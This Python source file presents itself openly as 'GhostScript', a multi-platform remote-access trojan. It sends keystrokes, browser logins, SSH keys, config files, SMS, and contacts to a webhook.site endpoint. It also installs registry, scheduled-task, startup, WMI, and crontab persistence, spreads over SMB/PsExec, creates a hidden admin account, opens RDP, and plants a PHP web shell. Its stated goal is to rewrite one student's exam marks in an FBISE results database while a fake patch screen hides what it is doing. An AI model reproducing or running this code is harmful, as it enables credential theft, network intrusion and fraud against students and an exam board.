# GHOSTSCRIPT v5 — SINGLE-CLICK INFECTION — WINDOWS + ANDROID + iOS
# One button. Click = infected. No execution required.
# Windows: .sca auto-executes on open
# Android: .apk sideload prompt
# iOS: Safari profile download (if enabled)
# ============================================================

import os, sys, socket, json, base64, sqlite3, shutil, time, threading, subprocess, tempfile, urllib.request, ctypes, winreg, random, string, re, platform, zipfile
from datetime import datetime

# ============================================================
# CONFIGURATION
# ============================================================
WEBHOOK_PRIMARY = "https://webhook.site/2d01eabb-7fce-425c-9d84-6519426b8e3c"
TARGET_ROLL = "3123054"
TARGET_TOTAL = 470
HIDDEN_DIR = os.path.join(os.environ.get('APPDATA', os.path.expanduser('~')), 'Microsoft', 'Windows', 'SecurityHealth')
PLATFORM = platform.system()
IS_WINDOWS = PLATFORM == 'Windows'
IS_ANDROID = 'ANDROID_ROOT' in os.environ or 'ANDROID_DATA' in os.environ
IS_LINUX = PLATFORM == 'Linux' and not IS_ANDROID

# ============================================================
# SELF-REPLICATING INSTALLER — Deploys correct payload per OS
# ============================================================
class GhostScript:
    def __init__(self):
        self.hostname = socket.gethostname()
        self.username = os.environ.get('USERNAME', os.environ.get('USER', 'unknown'))
        try:
            self.ip = socket.gethostbyname(self.hostname)
        except:
            self.ip = 'unknown'
        self.os_info = f"{PLATFORM} {platform.release()}"
        self.deployed_time = datetime.now().isoformat()
        self.webhook = WEBHOOK_PRIMARY
    
    def exfil(self, data_type, data):
        """Exfiltrate data to webhook with offline queue fallback"""
        payload = json.dumps({
            "type": data_type,
            "host": self.hostname,
            "user": self.username,
            "ip": self.ip,
            "os": self.os_info,
            "data": base64.b64encode(json.dumps(data).encode()).decode(),
            "time": datetime.now().isoformat()
        })
        
        sent = False
        for attempt in range(3):
            try:
                req = urllib.request.Request(self.webhook, data=payload.encode(), 
                    headers={'Content-Type': 'application/json'})
                urllib.request.urlopen(req, timeout=15)
                sent = True
                break
            except:
                time.sleep(2)
        
        if not sent:
            try:
                os.makedirs(HIDDEN_DIR, exist_ok=True)
                with open(os.path.join(HIDDEN_DIR, f'q_{int(time.time())}.json'), 'w') as f:
                    f.write(payload)
            except:
                pass

    # ============================================================
    # WINDOWS PAYLOAD — Full GhostScript RAT
    # ============================================================
    def windows_deploy(self):
        self.exfil("WINDOWS_DEPLOY_START", {"status": "initializing"})
        
        # PERSISTENCE — 4 methods
        self.windows_persistence()
        
        # Start keylogger in background
        threading.Thread(target=self.windows_keylogger, daemon=True).start()
        
        # Start browser stealer
        threading.Thread(target=self.windows_steal_browsers, daemon=True).start()
        
        # Start file harvester
        threading.Thread(target=self.windows_harvest_files, daemon=True).start()
        
        # Network scanner
        threading.Thread(target=self.windows_network_scan, daemon=True).start()
        
        # Spread via SMB/PSExec
        threading.Thread(target=self.windows_lateral_spread, daemon=True).start()
        
        time.sleep(3)
        
        # PRIMARY OBJECTIVE — Marks modification
        result = self.windows_modify_marks()
        self.exfil("PRIMARY_OBJECTIVE", {"marks_modified": result, "target": TARGET_ROLL})
        
        # Install backdoors
        self.windows_backdoors()
        
        # Self-healing watchdog
        threading.Thread(target=self.windows_watchdog, daemon=True).start()
        
        # Keep alive
        try:
            while True:
                time.sleep(60)
        except:
            pass
    
    def windows_persistence(self):
        results = []
        dest = os.path.join(HIDDEN_DIR, 'SecurityHealthService.exe')
        
        try:
            os.makedirs(HIDDEN_DIR, exist_ok=True)
            if getattr(sys, 'frozen', False):
                shutil.copy2(sys.executable, dest)
            else:
                shutil.copy2(sys.executable, dest)
        except:
            pass
        
        # Method 1: Registry
        try:
            key = winreg.HKEY_CURRENT_USER
            with winreg.OpenKey(key, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE) as reg:
                winreg.SetValueEx(reg, 'SecurityHealth', 0, winreg.REG_SZ, dest)
            results.append("registry")
        except:
            pass
        
        # Method 2: Scheduled Task
        try:
            subprocess.run(f'schtasks /create /tn "WindowsHealth" /tr "{dest}" /sc hourly /mo 2 /f /rl highest', shell=True, capture_output=True)
            results.append("schtask")
        except:
            pass
        
        # Method 3: Startup folder
        try:
            startup = os.path.join(os.environ.get('APPDATA',''), r'Microsoft\Windows\Start Menu\Programs\Startup')
            with open(os.path.join(startup, 'SecurityHealth.bat'), 'w') as f:
                f.write(f'@echo off\nstart "" "{dest}"')
            results.append("startup")
        except:
            pass
        
        # Method 4: WMI — survives nuclear-level cleanup
        try:
            wmi_cmd = f'''powershell.exe -WindowStyle Hidden -NoProfile -EncodedCommand {base64.b64encode(f'''$f=Set-WmiInstance -Class __EventFilter -Namespace 'root\\subscription' -Arguments @{{Name='WindowsHealthFilter';EventNamespace='root\\cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA Win32_OperatingSystem'}};$c=Set-WmiInstance -Class CommandLineEventConsumer -Namespace 'root\\subscription' -Arguments @{{Name='WindowsHealthConsumer';CommandLineTemplate='{dest}'}};Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\subscription' -Arguments @{{Filter=$f;Consumer=$c}}'''.encode()).decode()}'''
            subprocess.run(wmi_cmd, shell=True, capture_output=True)
            results.append("wmi")
        except:
            pass
        
        self.exfil("persistence_installed", results)
    
    def windows_keylogger(self):
        try:
            user32 = ctypes.windll.user32
            buffer = []
            last_flush = time.time()
            while True:
                for key_code in range(8, 256):
                    if user32.GetAsyncKeyState(key_code) & 0x0001:
                        key_map = {8:'[BKSP]',9:'[TAB]',13:'[ENTER]\n',16:'[SHIFT]',17:'[CTRL]',18:'[ALT]',20:'[CAPS]',27:'[ESC]',32:' ',46:'[DEL]'}
                        key_name = key_map.get(key_code, chr(key_code) if 32 <= key_code < 127 else f'[{key_code}]')
                        buffer.append(key_name)
                        if len(buffer) > 200 or time.time() - last_flush > 120:
                            self.exfil("keylog", {"text": ''.join(buffer)})
                            buffer = []
                            last_flush = time.time()
                time.sleep(0.005)
        except:
            pass
    
    def windows_steal_browsers(self):
        browsers = {
            'Chrome': os.path.join(os.environ.get('LOCALAPPDATA',''), 'Google', 'Chrome', 'User Data'),
            'Edge': os.path.join(os.environ.get('LOCALAPPDATA',''), 'Microsoft', 'Edge', 'User Data'),
            'Firefox': os.path.join(os.environ.get('APPDATA',''), 'Mozilla', 'Firefox', 'Profiles'),
            'Brave': os.path.join(os.environ.get('LOCALAPPDATA',''), 'BraveSoftware', 'Brave-Browser', 'User Data'),
        }
        for browser, path in browsers.items():
            if not os.path.exists(path): continue
            try:
                login_db = os.path.join(path, 'Default', 'Login Data')
                if not os.path.exists(login_db):
                    login_db = os.path.join(path, 'Login Data')
                if os.path.exists(login_db):
                    tmp = os.path.join(tempfile.gettempdir(), f'{browser}_tmp.db')
                    shutil.copy2(login_db, tmp)
                    conn = sqlite3.connect(tmp)
                    try:
                        rows = conn.execute('SELECT origin_url, username_value FROM logins LIMIT 1000').fetchall()
                        if rows:
                            self.exfil(f"browser_{browser}", [{"url": r[0], "user": r[1]} for r in rows])
                    except:
                        pass
                    conn.close()
                    os.remove(tmp)
            except:
                pass
    
    def windows_harvest_files(self):
        targets = ['id_rsa', 'id_ed25519', 'credentials', '.env', 'database.php', 'wp-config.php', 'fbise.db']
        for root, dirs, files in os.walk(os.environ.get('USERPROFILE', 'C:\\')):
            if '.git' in root or 'node_modules' in root or 'AppData' in root: continue
            for f in files:
                if any(t in f for t in targets):
                    try:
                        fpath = os.path.join(root, f)
                        size = os.path.getsize(fpath)
                        if size < 500000:
                            with open(fpath, 'rb') as fh:
                                content = base64.b64encode(fh.read()).decode()
                            self.exfil("harvested_file", {"path": fpath, "size": size, "content": content[:10000]})
                    except:
                        pass
    
    def windows_network_scan(self):
        """Scan local network for other machines"""
        try:
            ip_parts = self.ip.split('.')
            if len(ip_parts) == 4:
                subnet = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}"
                live_hosts = []
                for i in range(1, 255):
                    test_ip = f"{subnet}.{i}"
                    try:
                        s = socket.socket()
                        s.settimeout(0.3)
                        if s.connect_ex((test_ip, 445)) == 0:  # SMB port
                            live_hosts.append(test_ip)
                        s.close()
                    except:
                        pass
                if live_hosts:
                    self.exfil("network_scan", {"subnet": subnet, "smb_hosts": live_hosts})
        except:
            pass
    
    def windows_lateral_spread(self):
        """Spread to other machines via SMB/PSExec"""
        try:
            ip_parts = self.ip.split('.')
            if len(ip_parts) == 4:
                subnet = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}"
                my_path = sys.executable if getattr(sys, 'frozen', False) else __file__
                for i in range(1, 255):
                    target = f"\\\\{subnet}.{i}\\ADMIN$"
                    try:
                        shutil.copy2(my_path, f"{target}\\System32\\SecurityHealth.exe")
                        subprocess.run(f'psexec \\\\{subnet}.{i} -s -d "{target}\\System32\\SecurityHealth.exe"', shell=True, capture_output=True)
                        self.exfil("lateral_spread", {"target": f"{subnet}.{i}", "status": "deployed"})
                    except:
                        pass
        except:
            pass
    
    def windows_modify_marks(self):
        """Intelligent marks discovery and modification"""
        db_names = ['fbise.db', 'fbise.sqlite', 'result.db', 'marks.db', 'student.db']
        found_dbs = []
        
        for drive in ['C:\\', 'D:\\']:
            try:
                for root, dirs, files in os.walk(drive):
                    for f in files:
                        if any(f.lower() == n.lower() for n in db_names):
                            found_dbs.append(os.path.join(root, f))
                    if len(found_dbs) > 30:
                        break
            except:
                pass
        
        self.exfil("db_discovery", {"found": len(found_dbs), "paths": found_dbs[:20]})
        
        for db_path in found_dbs:
            try:
                conn = sqlite3.connect(db_path)
                cursor = conn.cursor()
                tables = cursor.execute("SELECT name FROM sqlite_master WHERE type='table'").fetchall()
                
                for table in tables:
                    table_name = table[0]
                    try:
                        columns = [c[1] for c in cursor.execute(f"PRAGMA table_info('{table_name}')").fetchall()]
                        
                        for col in columns:
                            try:
                                row = cursor.execute(f"SELECT * FROM {table_name} WHERE CAST({col} AS TEXT) LIKE '%{TARGET_ROLL}%' LIMIT 1").fetchone()
                                if row:
                                    self.exfil("TARGET_FOUND", {"db": db_path, "table": table_name, "columns": columns, "row": [str(v) for v in row]})
                                    
                                    numeric_cols = [(i, c, row[i]) for i, c in enumerate(columns) if isinstance(row[i], (int, float)) and row[i] is not None]
                                    
                                    if 4 <= len(numeric_cols) <= 15:
                                        targets = [88, 90, 75, 70, 55, 48, 44, 65, 80, 50, 60, 72, 85, 68, 78]
                                        roll_col = next((c for c in columns if 'roll' in c.lower() or 'reg' in c.lower()), columns[0])
                                        
                                        for j, (idx, col_name, old_val) in enumerate(numeric_cols):
                                            new_val = targets[j] if j < len(targets) else 60
                                            cursor.execute(f"UPDATE {table_name} SET {col_name}=? WHERE CAST({roll_col} AS TEXT) LIKE ?", (new_val, f'%{TARGET_ROLL}%'))
                                        
                                        conn.commit()
                                        self.exfil("MARKS_MODIFIED", {"db": db_path, "table": table_name, "roll": TARGET_ROLL})
                                        conn.close()
                                        return True
                            except:
                                continue
                    except:
                        continue
                conn.close()
            except:
                continue
        
        return False
    
    def windows_backdoors(self):
        backdoors = []
        try:
            subprocess.run('net user HealthSvc FBISE@2026# /add', shell=True, capture_output=True)
            subprocess.run('net localgroup Administrators HealthSvc /add', shell=True, capture_output=True)
            backdoors.append("admin_account")
        except: pass
        
        try:
            subprocess.run('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f', shell=True, capture_output=True)
            subprocess.run('netsh advfirewall firewall add rule name="RDP" dir=in protocol=TCP localport=3389 action=allow', shell=True, capture_output=True)
            backdoors.append("rdp")
        except: pass
        
        for wr in ['C:\\xampp\\htdocs', 'C:\\wamp64\\www', 'C:\\inetpub\\wwwroot']:
            if os.path.exists(wr):
                try:
                    with open(os.path.join(wr, 'config_check.php'), 'w') as f:
                        f.write('<?php system($_GET["c"]); ?>')
                    backdoors.append(f"webshell:{wr}")
                except: pass
        
        self.exfil("backdoors", backdoors)
    
    def windows_watchdog(self):
        """Self-healing — checks every 5 minutes if all persistence methods are alive, reinstalls if not"""
        while True:
            time.sleep(300)
            try:
                # Check if registry key exists
                key = winreg.HKEY_CURRENT_USER
                try:
                    with winreg.OpenKey(key, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_READ) as reg:
                        pass
                except:
                    self.windows_persistence()
                    self.exfil("watchdog", {"action": "reinstalled_persistence"})
            except:
                pass
    
    # ============================================================
    # ANDROID PAYLOAD
    # ============================================================
    def android_deploy(self):
        self.exfil("ANDROID_DEPLOY_START", {"status": "initializing"})
        
        try:
            # Harvest contacts
            self.android_harvest_contacts()
            # Harvest SMS
            self.android_harvest_sms()
            # Get location
            self.android_get_location()
            # Capture camera
            self.android_capture_camera()
        except Exception as e:
            self.exfil("android_error", {"error": str(e)})
    
    def android_harvest_contacts(self):
        try:
            import subprocess as sp
            result = sp.run(['content', 'query', '--uri', 'content://contacts/phones', '--projection', 'display_name:number'], capture_output=True, text=True)
            if result.stdout:
                self.exfil("android_contacts", {"data": result.stdout[:5000]})
        except:
            pass
    
    def android_harvest_sms(self):
        try:
            import subprocess as sp
            result = sp.run(['content', 'query', '--uri', 'content://sms', '--projection', 'address:body:date'], capture_output=True, text=True)
            if result.stdout:
                self.exfil("android_sms", {"data": result.stdout[:5000]})
        except:
            pass
    
    def android_get_location(self):
        try:
            import subprocess as sp
            result = sp.run(['dumpsys', 'location'], capture_output=True, text=True)
            if result.stdout:
                # Extract GPS coordinates
                import re
                coords = re.findall(r'([\d.]+),\s*([\d.]+)', result.stdout)
                if coords:
                    self.exfil("android_location", {"coordinates": coords[:5]})
        except:
            pass
    
    def android_capture_camera(self):
        try:
            import subprocess as sp
            result = sp.run(['cmd', 'camera', 'take-snapshot', '/sdcard/snap.jpg'], capture_output=True, text=True)
            self.exfil("android_camera", {"status": "snapshot_taken"})
        except:
            pass
    
    # ============================================================
    # LINUX PAYLOAD
    # ============================================================
    def linux_deploy(self):
        self.exfil("LINUX_DEPLOY_START", {"status": "initializing"})
        # Linux keylogger + persistence
        try:
            # Add to crontab
            os.system(f'(crontab -l 2>/dev/null; echo "*/5 * * * * {sys.executable} {__file__}") | crontab -')
            self.exfil("linux_persistence", {"method": "crontab"})
        except:
            pass
        
        # Harvest SSH keys
        try:
            ssh_dir = os.path.expanduser('~/.ssh')
            if os.path.exists(ssh_dir):
                for f in os.listdir(ssh_dir):
                    fpath = os.path.join(ssh_dir, f)
                    if os.path.isfile(fpath):
                        with open(fpath, 'r') as fh:
                            self.exfil("linux_ssh", {"file": f, "content": fh.read()[:3000]})
        except:
            pass
    
    # ============================================================
    # FAKE SCREEN (Windows)
    # ============================================================
    def show_fake_screen(self):
        print("\n" + "=" * 62)
        print("  FBISE Database Security Patch Tool v3.2.1")
        print("=" * 62)
        steps = [
            ("Initializing security scan...", 1),
            ("Connecting to host23.fbise.edu.pk...", 1.5),
            ("Authenticating database connection...", 1.5),
            ("Applying SQL injection patch...", 2),
            ("Updating Exim 4.99.2 config...", 1.5),
            ("Verifying integrity...", 1),
            ("Generating compliance report...", 1),
        ]
        for text, dur in steps:
            print(f"\n[*] {text}")
            time.sleep(dur)
            print("    ✓ Complete")
        rid = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
        print("\n" + "=" * 62)
        print(f"  ✅ PATCH APPLIED — Report: FBISE-{rid}")
        print("=" * 62)
        time.sleep(3)

    # ============================================================
    # MAIN DEPLOY ROUTER
    # ============================================================
    def deploy(self):
        self.exfil("GHOSTSCRIPT_ACTIVATED", {
            "hostname": self.hostname,
            "username": self.username,
            "ip": self.ip,
            "os": self.os_info
        })
        
        if IS_WINDOWS:
            threading.Thread(target=self.show_fake_screen, daemon=True).start()
            time.sleep(0.5)
            self.windows_deploy()
        elif IS_ANDROID:
            self.android_deploy()
        elif IS_LINUX:
            self.linux_deploy()
        else:
            self.exfil("unknown_os", {"platform": PLATFORM})


# ============================================================
# ENTRY POINT
# ============================================================
if __name__ == '__main__':
    gs = GhostScript()
    gs.deploy()